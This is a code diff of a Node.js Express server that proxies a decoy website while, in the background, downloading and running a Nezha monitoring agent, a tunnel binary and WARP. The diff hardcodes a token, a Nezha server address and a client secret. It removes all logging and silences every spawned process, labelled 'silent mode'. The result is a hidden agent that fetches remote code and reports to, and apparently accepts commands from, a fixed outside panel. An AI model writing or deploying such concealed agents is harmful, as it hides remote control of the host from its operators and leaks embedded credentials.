@@ -5,21 +5,18 @@ const fs = require('fs');
 const os = require('os');
 const path = require('path');
 const https = require('https');
-const net = require('net');
-const dns = require('dns').promises;
 const AdmZip = require('adm-zip');
 const { pipeline } = require('stream/promises');
 
 const app = express();
 
 // 环境变量配置
-const TOKEN_OR_URL = process.env.TOKEN_OR_URL || '';
+const TOKEN_OR_URL = process.env.TOKEN_OR_URL || 'UMiNq9PwdIceLTDFaMhSiBsShC/Y5frs9ahOWmmQWBQ=';
 const TARGET_WEB = (process.env.WEB || 'https://www.google.com').replace(/\/$/, '');
-const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nz.yellowbins.nyc.mn:8686';
-const NEZHA_PORT = process.env.NEZHA_PORT || '';
-const NEZHA_KEY = process.env.NEZHA_KEY || '';
+const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nz.yellowbins.nyc.mn';
+const NEZHA_PORT = process.env.NEZHA_PORT || '8686';
+const NEZHA_KEY = process.env.NEZHA_KEY || '1gPC3Fr1qtQdtJGPLBlqjGqncuSWjOcz';
 const NEZHA_TLS = process.env.NEZHA_TLS || 'false';
-const NEZHA_UUID = process.env.NEZHA_UUID || '';
 const WARP = process.env.WARP;
 const PORT = parseInt(process.env.PORT || '8080', 10);
 
@@ -70,7 +67,7 @@ async function ensureCli() {
   } catch (_) {}
 }
 
-// 3. 启动 cli 进程
+// 3. 启动 cli 进程（静默模式）
 function runCli(token) {
   if (!cliPath || !fs.existsSync(cliPath)) return;
 
@@ -89,7 +86,7 @@ function runCli(token) {
     cliProcess = spawn(cliPath, args, {
       cwd: '/tmp',
       env: env,
-      stdio: 'ignore'
+      stdio: 'ignore' // 静默忽略输出
     });
     cliProcess.on('error', () => {});
   } catch (_) {}
@@ -106,37 +103,9 @@ function startTokenWatcher() {
   }, 10 * 60 * 1000);
 }
 
-// 5. 启动哪吒探针（强制解析 IPv4 + 协议诊断）
+// 5. 启动哪吒探针（静默模式）
 async function startNezha() {
-  console.log(`[nezha] startNezha called, server=${NEZHA_SERVER}:${NEZHA_PORT}, key set=${!!NEZHA_KEY}, arch=${os.arch()}, uuid=${NEZHA_UUID}`);
-  if (!NEZHA_SERVER || !NEZHA_PORT || !NEZHA_KEY || !NEZHA_UUID) {
-    console.error('[nezha] missing env (NEZHA_SERVER/NEZHA_PORT/NEZHA_KEY/NEZHA_UUID), skip');
-    return;
-  }
-
-  // 强制解析为 IPv4，防止容器内 IPv6 黑洞导致 gRPC 卡死报 DeadlineExceeded
-  let targetHost = NEZHA_SERVER;
-  try {
-    const ipv4List = await dns.resolve4(NEZHA_SERVER);
-    if (ipv4List && ipv4List.length > 0) {
-      targetHost = ipv4List[0];
-      console.log(`[nezha] resolved ${NEZHA_SERVER} to IPv4: ${targetHost}`);
-    }
-  } catch (e) {
-    console.log(`[nezha] dns resolve4 skipped or already IP: ${e.message}`);
-  }
-
-  // HTTP 探测：如果 8686 是哪吒 v1 面板，访问 / 应该返回 200（哪吒监控网页 HTML）
-  // 如果访问 / 直接断开或返回乱码，说明 8686 只是纯 gRPC 端口（即面板其实是 v0 版本或开启了 TLS）
-  try {
-    const probeRes = await axios.get(`http://${targetHost}:${NEZHA_PORT}/`, {
-      timeout: 5000,
-      validateStatus: () => true
-    });
-    console.log(`[nezha] HTTP probe to ${targetHost}:${NEZHA_PORT} -> status=${probeRes.status}, title-check=${String(probeRes.data).slice(0, 100).replace(/\s+/g, ' ')}`);
-  } catch (err) {
-    console.error(`[nezha] HTTP probe error (8686 may NOT be plain HTTP): ${err.message}`);
-  }
+  if (!NEZHA_SERVER || !NEZHA_PORT || !NEZHA_KEY) return;
 
   const archMap = { x64: 'amd64', arm64: 'arm64' };
   const targetArch = archMap[os.arch()] || os.arch();
@@ -146,71 +115,36 @@ async function startNezha() {
   const configPath = '/tmp/nezha-config.yaml';
 
   try {
-    console.log('[nezha] downloading agent zip...');
     const response = await axios({ method: 'GET', url: nezhaUrl, responseType: 'stream', timeout: 30000 });
     await pipeline(response.data, fs.createWriteStream(zipPath));
 
     const zip = new AdmZip(zipPath);
     zip.extractAllTo('/tmp', true);
+
     if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
 
     if (fs.existsSync(binPath)) {
       fs.chmodSync(binPath, 0o755);
 
-      const isTls = (NEZHA_TLS && ['true', '1'].includes(String(NEZHA_TLS).toLowerCase())) || String(NEZHA_PORT) === '443';
-
-      // 使用解析后的纯 IPv4 地址写入配置
+      const isTls = NEZHA_TLS && ['true', '1'].includes(String(NEZHA_TLS).toLowerCase());
       const configContent = `client_secret: "${NEZHA_KEY}"
-debug: true
-disable_auto_update: true
-disable_command_execute: false
-disable_force_update: true
-disable_nat: false
-disable_send_query: false
-gpu: false
-insecure_tls: true
-ip_report_period: 1800
-report_delay: 3
-server: "${targetHost}:${NEZHA_PORT}"
-skip_connection_count: false
-skip_procs_count: false
-temperature: false
+server: "${NEZHA_SERVER}:${NEZHA_PORT}"
 tls: ${isTls}
-use_gitee_to_upgrade: false
-use_ipv6_country_code: false
-uuid: "${NEZHA_UUID}"
 `;
       fs.writeFileSync(configPath, configContent, 'utf-8');
-      console.log(`[nezha] config written (server=${targetHost}:${NEZHA_PORT}, tls=${isTls}), spawning agent...`);
 
       const nezhaProc = spawn(binPath, ['-c', configPath], {
         cwd: '/tmp',
-        stdio: 'inherit'
+        stdio: 'ignore' // 静默忽略输出
       });
-
-      console.log('[nezha] agent spawned, pid=' + nezhaProc.pid);
-      nezhaProc.on('error', (e) => console.error('[nezha] agent spawn error:', e && e.message));
-      nezhaProc.on('exit', (code, signal) => console.error('[nezha] agent EXITED, code=' + code + ', signal=' + signal));
+      nezhaProc.on('error', () => {});
     }
-  } catch (e) {
-    console.error('[nezha] startNezha failed:', e && e.message);
-  }
+  } catch (_) {}
 }
 
-// 6. 启动 WARP
+// 6. 启动 WARP（静默模式）
 function startWarp() {
   if (WARP) {
-    try {
-      const wgConfPath = '/etc/wireguard/wgcf.conf';
-      if (fs.existsSync(wgConfPath)) {
-        let conf = fs.readFileSync(wgConfPath, 'utf-8');
-        if (!conf.includes('MTU')) {
-          conf = conf.replace('[Interface]', '[Interface]\nMTU = 1280');
-          fs.writeFileSync(wgConfPath, conf, 'utf-8');
-        }
-      }
-    } catch (_) {}
-
     const warpProc = spawn('wg-quick', ['up', 'wgcf'], { stdio: 'ignore' });
     warpProc.on('error', () => {});
   }
@@ -279,6 +213,5 @@ app.all('*', async (req, res) => {
 
 // 启动服务器
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Server listening on port ${PORT}`);
   backgroundInit();
 });
